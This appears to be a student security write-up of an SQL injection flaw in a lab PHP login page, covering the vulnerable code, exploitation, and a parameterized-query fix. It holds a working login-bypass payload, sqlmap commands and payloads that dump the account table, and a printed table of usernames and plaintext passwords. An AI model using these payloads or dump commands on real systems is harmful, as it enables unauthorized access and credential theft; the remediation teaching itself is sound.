<html>
	<body>
		<h1> # FIX OWASP 2013 A1: SQL Injection, use prepared statements </h1>
		<h2> The Vulnerability </h2>
		<ul>
			<li> Brief explanation:
<xmp>
SQL injection occurs when the app puts user input into SQL queries without sanitization. The code uses pg_prepare but the input is concatenated into the query string before preparing it which defeats the purpose of prepared statements.
</xmp>
			</li>
			<li> Example code etc.:
<xmp>
The vulnerable code concatenates user input into the query:

(line 48-54)
$user=$_REQUEST['user'];
$password=$_REQUEST['password'];
$dbconn = pg_connect_db();
$query= "SELECT id, username, firstName, lastName, passwd FROM account WHERE username='$user'";
$result = pg_prepare($dbconn, "", $query);
$result = pg_execute($dbconn, "", array());

The $user variable is inserted into the query directly making it vulnerable to SQL injection.
</xmp>
			</li>
			<li> How attacker exploits this: 
<xmp>
The attacker exploits this by:

1. Going to http://192.168.10.35/fourFours/ login page

2. Entering this as the username:
   hi' OR '1'='1';--

3. Entering any password

4. The SQL query becomes:
   SELECT id, username, firstName, lastName, passwd FROM account WHERE username='hi' OR '1'='1';--

5. Since '1'='1' is always true the query returns all users and logs in as the first user without knowing the password
</xmp>
			</li>
			<li> Impact: CIAaa and some details
<xmp>
C: Attackers can read any data from the database such as passwords and user information
I: The attacker can modify or delete records using UPDATE or DELETE statements in the attack
A: The attacker can drop tables or entire database making all user information unavailable

SQL injection allows complete control of the database. We can bypass authentication, modify records, or destroy the database.
</xmp>
			</li>
		</ul>

		<h2> INSTRUCTIONS TO VERIFY VULNERABILITY BELOW </h2>
<xmp>
Method 1: manual inputing
1. Visit http://192.168.10.35/fourFours/ login page

2. Enter this as username: test' OR '1'='1';--

3. Enter any password

4. You will be logged in without valid credentials

Method 2: using sqlmap in Kali Linux
1. Open terminal in Kali Linux

2. Run sqlmap to test the login form:
   sqlmap -u "http://192.168.10.35/fourFours/index.php" --data "user=test&password=test&operation=login" --batch

3. sqlmap will detect the injection vulnerability in the user param
sqlmap identified the following injection point(s) with a total of 36 HTTP(s) requests:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: user=test' AND (SELECT (CASE WHEN (8782=8782) THEN NULL ELSE CAST((CHR(100)||CHR(104)||CHR(118)||CHR(87)) AS NUMERIC) END)) IS NULL-- mhaI&password=test&operation=login

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: user=test' AND 4397=CAST((CHR(113)||CHR(112)||CHR(118)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (4397=4397) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(112)||CHR(113)) AS NUMERIC)-- DKOR&password=test&operation=login

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: user=test' AND 4603=(SELECT 4603 FROM PG_SLEEP(5))-- uhnv&password=test&operation=login
---

4. extracting database:
   sqlmap -u "http://192.168.10.35/fourFours/index.php" --data "user=test&password=test&operation=login" --dbs --batch
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public

5. dump user tables:
   sqlmap -u "http://192.168.10.35/fourFours/index.php" --data "user=test&password=test&operation=login" -D public -T account --dump-all --batch
Database: public
Table: account
[15 entries]
+----+----------------+-------------+-----------------------+-----------+
| id | passwd         | lastname    | username              | firstname |
+----+----------------+-------------+-----------------------+-----------+
| 1  | sdfdsfd        | Large       | bigBoy                | Alex      |
| 2  | lion           | Lion        | anne                  | Anne      |
| 3  | fourfivesix    | Swim        | lindah20              | Linda     |
| 4  | silverisbetter | Silver      | coins                 | Abagail   |
| 5  | password1      | Burn        | matchstick            | Jessie    |
| 6  | password       | Cup         | coffee                | Annie     |
| 7  | passw0rd       | Bassell     | ssll                  | Diane     |
| 8  | cliff          | Mountain    | cliff                 | Steve     |
| 9  | sdxfdsgger     | Rosenbloom  | arnold@cs.toronto.edu | Arnold    |
| 10 | perl           | Perlmuter   | perl                  | Jay       |
| 11 | Peter          | Piper       | pickApeck             | Peter     |
| 12 | jbh            | Binghampton | hotel                 | Jen       |
| 13 | esrever        | Kleinman    | dk@gmail.com          | David     |
| 14 | badPassword    | Kowalski    | eightball@gmail.com   | Jesse     |
| 15 | grant          | Grant       | ivanna                | Ivanna    |
+----+----------------+-------------+-----------------------+-----------+

sqlmap will automatically find and exploit injections to extract all the data from the database.
</xmp>
                <h2> The Fix </h2>
                <ul>
                        <li> Explain the fix:
<xmp>
We fix this by using proper parameterized queries with placeholders:

$user=$_REQUEST['user'];
$password=$_REQUEST['password'];
$dbconn = pg_connect_db();
$result = pg_prepare($dbconn, "", "SELECT id, username, firstName, lastName, passwd FROM account WHERE username=$1");
$result = pg_execute($dbconn, "", array($user));

The $1 is a placeholder and the user value is passed separately in the array to pg_execute.
</xmp>
                        </li>
                        <li> How the fix resolves the issue:
<xmp>
This fix prevents SQL injection by separating SQL code from data. When we use parameterized queries the database treats the input as literal data and not code.

Now when we submit test' OR '1'='1';-- with the fix the database treats the entire string as a literal username to search for, and will look for a user named "test' OR '1'='1;--" which doesnt exist.
The placeholder $1 tells the database this is a parameter and pg_execute will safely pass the value.
</xmp>
                        </li>
                </ul>

	</body>
</html>
